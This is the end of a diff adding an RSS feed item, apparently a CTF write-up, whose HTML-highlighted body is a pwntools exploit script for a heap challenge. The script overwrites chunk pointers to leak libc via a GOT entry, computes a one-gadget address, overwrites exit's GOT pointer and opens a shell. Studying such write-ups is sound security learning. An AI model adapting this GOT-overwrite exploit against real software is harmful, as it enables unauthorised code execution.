+    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">_index</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">_size</span><span class="p">):</span>
+    <span class="n">menu</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Let's ding_malloc!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+    <span class="c">#s.recvuntil("Give me size n &lt; 2049: ")</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">_size</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">show_heap</span><span class="p">():</span>
+    <span class="n">menu</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"010 0x"</span><span class="p">)</span>
+    <span class="n">rand_libc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">rand_libc</span>
+
+<span class="k">def</span> <span class="nf">fill_data</span><span class="p">(</span><span class="n">_binnum</span><span class="p">,</span> <span class="n">_chunknum</span><span class="p">,</span> <span class="n">_data</span><span class="p">):</span>
+    <span class="n">menu</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+    <span class="c">#s.recvuntil("bin num? : ")</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">_binnum</span><span class="p">))</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+    <span class="c">#s.recvuntil("chunk num? : ")</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">_chunknum</span><span class="p">))</span>
+    <span class="c">#s.recvuntil("input: ")</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">_data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">libc_leak</span><span class="p">():</span>
+    <span class="n">alloc</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+    <span class="c">#alloc(10)</span>
+    <span class="n">fill_data</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rand_got</span><span class="p">))</span>
+    <span class="n">alloc</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+    <span class="n">rand_libc</span> <span class="o">=</span> <span class="n">show_heap</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">rand_libc</span>
+
+<span class="k">def</span> <span class="nf">solver</span><span class="p">(</span><span class="n">_system</span><span class="p">):</span>
+    <span class="n">fill_data</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">exit_got_ptr</span><span class="p">))</span>
+    <span class="n">alloc</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+    <span class="n">fill_data</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">_system</span><span class="p">))</span>
+    <span class="n">menu</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+
+<span class="n">auth</span><span class="p">()</span>
+<span class="n">rand_libc</span> <span class="o">=</span> <span class="n">libc_leak</span><span class="p">()</span>
+
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">rand_libc</span><span class="o">-</span><span class="n">rand_offset</span>
+<span class="n">system_libc</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="n">system_offset</span>
+<span class="n">one_shot</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x4526a</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"rand_libc : </span><span class="si">%</span><span class="s">x"</span> <span class="o">%</span> <span class="n">rand_libc</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc_base : </span><span class="si">%</span><span class="s">x"</span> <span class="o">%</span> <span class="n">libc_base</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"system_libc : </span><span class="si">%</span><span class="s">x"</span> <span class="o">%</span> <span class="n">system_libc</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"one_shot : </span><span class="si">%</span><span class="s">x"</span> <span class="o">%</span> <span class="n">one_shot</span><span class="p">)</span>
+
+<span class="n">solver</span><span class="p">(</span><span class="n">one_shot</span><span class="p">)</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+	  ]]></description>
+	</item>
+
+
+</channel>
+</rss>
